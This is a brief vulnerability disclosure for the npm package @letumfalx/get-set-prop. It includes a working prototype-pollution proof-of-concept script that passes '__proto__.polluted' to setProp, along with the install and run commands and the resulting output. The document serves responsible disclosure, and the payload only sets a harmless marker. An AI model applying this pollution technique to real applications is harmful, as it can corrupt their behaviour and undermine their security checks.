# Description

`@letumfalx/get-set-prop` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var getSetProp = require("@letumfalx/get-set-prop")
var obj = {}
console.log("Before : " + {}.polluted);
getSetProp.setProp(obj, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + {}.polluted);
```


2. Execute the following commands in terminal:

```
npm i @letumfalx/get-set-prop # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
